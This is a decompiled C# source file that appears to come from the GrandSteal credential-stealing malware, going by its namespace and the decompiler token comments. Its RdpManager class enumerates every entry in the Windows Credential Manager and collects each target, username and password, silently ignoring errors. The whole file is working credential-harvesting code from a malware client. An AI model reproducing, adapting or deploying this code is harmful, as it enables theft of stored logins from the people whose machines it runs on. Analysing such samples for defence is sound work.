using System;
using System.Collections.Generic;
using CredentialManagement;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x0200001D RID: 29
	public class RdpManager : ICredentialsManager<RdpCredential>
	{
		// Token: 0x060000AA RID: 170 RVA: 0x0000707C File Offset: 0x0000527C
		public List<RdpCredential> GetAll()
		{
			List<RdpCredential> list = new List<RdpCredential>();
			try
			{
				CredentialSet credentialSet = new CredentialSet().Load();
				int num = 0;
				while (true)
				{
					int arg_2D_0 = num;
					int? num2 = (credentialSet == null) ? null : new int?(credentialSet.Count);
					if (!(arg_2D_0 < num2.GetValueOrDefault() & num2.HasValue))
					{
						break;
					}
					List<RdpCredential> arg_C1_0 = list;
					RdpCredential expr_42 = new RdpCredential();
					Credential expr_4A = credentialSet[num];
					expr_42.Target = ((expr_4A != null) ? expr_4A.get_Target() : null);
					Credential expr_63 = credentialSet[num];
					expr_42.Password = (string.IsNullOrEmpty((expr_63 != null) ? expr_63.get_Password() : null) ? "NOT SAVED" : credentialSet[num].get_Password());
					Credential expr_96 = credentialSet[num];
					expr_42.Username = (string.IsNullOrEmpty((expr_96 != null) ? expr_96.get_Username() : null) ? "NOT SAVED" : credentialSet[num].get_Username());
					arg_C1_0.Add(expr_42);
					num++;
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
